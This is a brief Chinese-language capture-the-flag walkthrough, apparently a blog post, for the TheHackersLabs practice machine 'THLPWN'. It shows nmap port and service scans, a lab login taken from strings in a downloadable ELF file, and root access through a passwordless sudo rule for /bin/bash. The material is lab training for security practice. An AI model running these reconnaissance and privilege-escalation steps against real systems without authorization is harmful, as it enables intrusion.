postData.contentHtml:
THLPWN

https://labs.thehackerslabs.com/machine/141

Recon

PortScan

➜  THLPWN nmap -sT -min-rate 10000 -p- 192.168.56.131  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 22:59 CST
Nmap scan report for 192.168.56.131
Host is up (0.0023s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3

Nmap done: 1 IP address (1 host up) scanned in 26.38 seconds

➜  THLPWN nmap -sT -A -p 22,25,80,110 192.168.56.131      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 23:01 CST
Nmap scan report for 192.168.56.131
Host is up (0.00060s latency).

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
25/tcp  open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open  http       nginx 1.22.1
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.22.1
110/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT     ADDRESS
1   0.24 ms 192.168.111.2
2   0.57 ms 192.168.56.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.40 seconds

枚举

看来还运行着邮件服务

我们根据 thl 的默认规则即可访问

一番摸索后在网站下载页面中能下载到一个 ELF 文件

通过 strings 可以拿到疑似用户的账户密码

通过凭据 thluser:9Kx7mP2wQ5nL8vT4bR6zY 成功进入后台

读取 user.txt

thluser@thlpwn:~$ cat flag.txt 
TxxxxxxxxxxxxxxxxxxxxxxH}

提权

查看 sudo 权限，666

thluser@thlpwn:~$ sudo -l
Matching Defaults entries for thluser on thlpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User thluser may run the following commands on thlpwn:
    (ALL) NOPASSWD: /bin/bash

直接 root 了

thluser@thlpwn:~$ sudo /bin/bash -p
root@thlpwn:/home/thluser#

我真没招了。。。
postData.title: TheHackersLabs - THLPWN
postData.description: THLPWN https://labs.thehackerslabs.com/machine/141 Recon PortScan 枚举 看来还运行着邮件服务 我们根据 thl 的默认规则即可访问 一番摸索后在网站下载页面中能下载到一个 ELF 文件 通过 strings 可以拿到疑似用户的账户密码...
